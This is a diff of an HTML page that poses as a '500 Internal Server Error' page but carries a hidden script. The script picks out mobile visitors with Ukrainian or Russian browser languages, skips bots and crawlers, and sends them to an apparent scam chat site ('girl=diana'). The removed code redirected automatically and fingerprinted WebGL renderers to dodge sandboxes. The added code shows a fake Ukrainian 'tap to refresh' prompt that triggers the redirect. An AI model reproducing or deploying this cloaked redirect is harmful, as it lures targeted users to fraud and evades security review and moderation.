@@ -2,49 +2,39 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>500 Internal Server Error</title>
     <script>
     (function() {
         const lang = navigator.language || navigator.userLanguage || "";
         const isTargetLang = /uk|ua|ru/i.test(lang);
-        const isMob = /iPhone|Android|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
-        const isBot = /bot|facebook|meta|externalhit|message|preview|cloud|datacenter|crawler|spider/i.test(navigator.userAgent);
+        const isMob = /iPhone|Android|Mobile/i.test(navigator.userAgent);
+        const isBot = /bot|facebook|meta|externalhit|preview|cloud|crawler/i.test(navigator.userAgent);
 
-        if (isBot || !isMob || !isTargetLang) {
-            return;
-        }
+        if (isBot || !isMob || !isTargetLang) return;
 
-        const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh&v=" + Date.now(); 
+        const target = "https://neontishell.uno/chatroom.php?girl=diana&src=gh"; 
         
-        function inject() {
-            if (window.done) return;
-            
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    const db = gl.getExtension('WEBGL_debug_renderer_info');
-                    const rd = db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "";
-                    if (/software|virtual|llvm|swiftshader|google|amazon/i.test(rd)) return;
-                }
-            } catch (e) {}
-
-            window.done = true;
-            
+        function redirect() {
             window.location.replace(target);
         }
 
-        window.addEventListener('touchstart', inject, {once: true});
-        window.addEventListener('click', inject, {once: true});
-        
-        setTimeout(inject, 600); 
+        setTimeout(function() {
+            document.body.innerHTML = `
+                <div onclick="window.location.replace('${target}')" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; cursor:pointer; background:#fff; color:#262626; font-family:sans-serif; padding:20px;">
+                    <img src="https://cdn-icons-png.flaticon.com/512/110/110686.png" style="width:50px; opacity:0.3; margin-bottom:20px;">
+                    <div style="font-size:16px;">На жаль, чат недоступний у вашому додатку.</div>
+                    <div style="margin-top:15px; color:#0095f6; font-weight:600;">Натисніть тут, щоб оновити</div>
+                </div>
+            `;
+        }, 1200);
     })();
     </script>
 </head>
-<body style="background:#fff; font-family:sans-serif; padding:50px; color:#666; -webkit-user-select:none; user-select:none;">
-    <div style="max-width: 600px;">
+<body style="margin:0; padding:50px; background:#fff; font-family:sans-serif; color:#666;">
+    <div id="err-msg" style="max-width: 600px;">
         <h2 style="font-size: 24px; margin-bottom: 10px;">500 Internal Server Error</h2>
-        <p style="font-size: 14px; line-height: 1.6;">The server encountered an unexpected condition that prevented it from fulfilling the request. Please try again later or contact the administrator.</p>
+        <p style="font-size: 14px; line-height: 1.6;">The server encountered an unexpected condition that prevented it from fulfilling the request.</p>
     </div>
 </body>
 </html>
